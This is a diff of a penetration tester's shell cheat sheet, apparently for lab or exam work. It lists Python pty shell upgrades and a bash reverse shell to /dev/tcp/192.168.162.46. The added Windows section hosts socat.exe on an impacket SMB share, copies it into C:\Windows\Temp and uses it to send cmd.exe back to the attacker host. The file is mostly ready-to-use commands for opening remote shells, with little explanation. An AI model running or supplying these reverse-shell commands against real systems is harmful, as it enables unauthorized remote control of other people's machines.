@@ -1,3 +1,6 @@
+==================================  
+Linux 
+
 which python python2 python3
 python -c 'import pty;pty.spawn("/bin/sh")'
 python3 -c 'import pty;pty.spawn("/bin/sh")'
@@ -12,9 +15,22 @@ alias ll='ls -lsaht --color=auto'
 alias lt='ls -lsahtr --color=auto' 
 reset
 
-Windows works best with rlwrap
-rlwrap nc -nlvp 443
-
 Last Resort
 bash -c "bash -i >& /dev/tcp/192.168.162.46/8002 0>&1"
 nc -nvlp 8002
+
+
+==================================  
+Windows
+rlwrap nc -nvlp 443 ..then upgrade to socat
+
+Kali
+locate socat.exe 
+cd ~\tools\privesc_windows
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support
+socat TCP4-LISTEN:443,fork STDOUT 
+
+Windows:
+cd C:\Windows\Temp
+copy \\192.168.162.46\share\socat.exe 
+socat.exe TCP4:192.168.162.46:443 EXEC:'cmd.exe',pipes 
